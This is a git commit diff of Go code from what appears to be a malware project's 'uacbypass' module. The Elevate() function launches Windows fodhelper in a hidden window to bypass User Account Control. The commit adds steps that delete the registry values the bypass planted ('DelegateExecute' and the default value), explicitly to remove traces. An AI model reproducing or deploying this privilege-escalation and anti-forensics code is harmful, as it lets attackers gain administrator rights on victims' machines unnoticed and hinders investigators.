ac79921a8e9c1e055b7e61ff01679b76bb7384ef
hackirby <145487845+hackirby@users.noreply.github.com>
2024-03-31 13:07:39 +0200

    remove traces of UAC bypass

--- modules/uacbypass/bypass.go
+++ modules/uacbypass/bypass.go
@@ -61,9 +61,22 @@ func Elevate() error {
 
 	cmd := exec.Command("cmd.exe", "/C", "fodhelper")
 	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
-	
 	err = cmd.Run()
-	return err
+	if err != nil {
+		return err
+	}
+
+	err = k.DeleteValue("")
+	if err != nil {
+		return err
+	}
+
+	err = k.DeleteValue("DelegateExecute")
+	if err != nil {
+		return err
+	}
+
+	return nil
 }
 
 func Run() {
